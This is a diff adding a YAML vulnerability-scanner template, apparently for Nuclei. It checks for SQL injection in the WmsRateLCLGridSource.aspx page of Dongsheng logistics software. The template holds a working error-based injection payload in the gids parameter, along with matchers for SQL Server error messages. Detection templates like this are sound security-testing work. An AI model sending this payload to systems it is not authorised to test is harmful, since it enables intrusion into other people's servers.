@@ -1,0 +1,29 @@
+id: dongshengsoft-wmsratelclgridsource-aspx-sqli
+info:
+  name: 东胜物流软件 WmsRateLCLGridSource.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    vendor: 东胜物流软件
+http:
+  - raw:
+      - |
+        GET /SeaiInfoLCL/WmsRateLCLGridSource.aspx?handle=getiswmsin&gids=1,2')and+1<@@version-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "Microsoft SQL Server"
+          - "SqlException"
+          - "DONGSHENG"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
